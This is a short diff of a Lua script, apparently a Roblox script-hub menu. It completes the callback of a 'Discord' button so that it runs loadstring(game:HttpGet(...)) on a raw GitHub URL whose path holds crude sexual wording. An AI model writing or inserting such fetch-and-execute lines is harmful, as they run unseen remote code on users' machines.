@@ -37,6 +37,6 @@ Tab:AddButton({
 Tab:AddButton({
     Name = "Discord",
     Callback = function()
-              loadstring(game:Ht
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/Imalwibest/Imalwibest/main/Discord%20sex%20mom%20cum"))()
       end    
 })
